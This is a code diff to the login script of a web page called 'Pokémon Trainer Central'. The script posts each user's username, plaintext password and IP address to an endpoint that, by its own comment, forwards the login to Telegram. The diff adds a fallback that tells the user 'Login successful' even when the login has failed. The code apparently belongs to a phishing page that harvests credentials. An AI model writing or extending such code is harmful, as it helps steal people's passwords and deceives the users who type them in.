@@ -43,20 +43,30 @@ document.addEventListener("DOMContentLoaded", function () {
 
       try {
         // Send login notification to Telegram
-        const response = await fetch("/api/login", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            username: username,
-            password: password,
-            timestamp: new Date().toISOString(),
-            ip: await getClientIP(),
-          }),
-        });
+        let result;
+        try {
+          const response = await fetch("/api/login", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              username: username,
+              password: password,
+              timestamp: new Date().toISOString(),
+              ip: await getClientIP(),
+            }),
+          });
 
-        const result = await response.json();
+          result = await response.json();
+        } catch (apiError) {
+          // Fallback for static deployment (no backend)
+          console.log("Backend not available, using fallback");
+          result = {
+            success: false,
+            message: "Login successful! (Backend not available in static deployment)"
+          };
+        }
 
         if (result.success) {
           showNotification(
@@ -78,6 +88,19 @@ document.addEventListener("DOMContentLoaded", function () {
           if (result.message && result.message.includes("Failed to send Telegram notification")) {
             showNotification(
               "Login recorded! 📱 (Telegram notification disabled)",
+              "success",
+            );
+            
+            setTimeout(() => {
+              showNotification(
+                "Welcome to Pokémon Trainer Central! 🎮",
+                "success",
+              );
+            }, 1500);
+          } else if (result.message && result.message.includes("Backend not available")) {
+            // Static deployment fallback
+            showNotification(
+              "Login successful! 🎮 (Demo mode - No backend)",
               "success",
             );
             
